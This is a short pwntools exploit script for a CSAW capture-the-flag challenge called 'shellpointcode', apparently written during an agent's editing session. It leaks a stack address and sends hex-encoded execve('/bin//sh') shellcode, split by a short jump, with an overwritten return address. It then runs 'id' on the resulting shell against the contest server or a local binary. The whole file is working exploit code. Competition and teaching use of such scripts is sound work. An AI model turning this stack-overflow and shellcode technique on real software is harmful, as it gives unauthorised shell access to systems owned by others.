from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

part1 = bytes.fromhex('31f65648bf2f62696e')
jump = bytes.fromhex('eb08')
part2 = bytes.fromhex('2f2f736857545f6a3b58990f05')

def exploit(p):
    p.recvuntil(b'node 1:')
    p.sendline(b'AAAA')
    p.recvuntil(b'node 2:')
    p.sendline(b'BBBB')
    p.recvuntil(b'node.next: ')
    leak = int(p.recvline().strip(), 16)
    log.info('leak = %#x' % leak)
    buf = leak - 0x13
    log.info('buf = %#x' % buf)
    p.recvuntil(b'initials:')
    payload = part1 + jump + p64(buf) + part2
    log.info('payload len = %d' % len(payload))
    p.sendline(payload)
    sleep(0.5)
    p.sendline(b'echo PWNED_MARKER')
    sleep(0.5)
    p.sendline(b'id')
    sleep(0.5)
    print(p.recvall(timeout=3).decode('latin-1'))

if __name__ == '__main__':
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        p = remote('pwn.chal.csaw.io', 8000)
    else:
        p = process('./shellpointcode')
    exploit(p)
end_of_edit

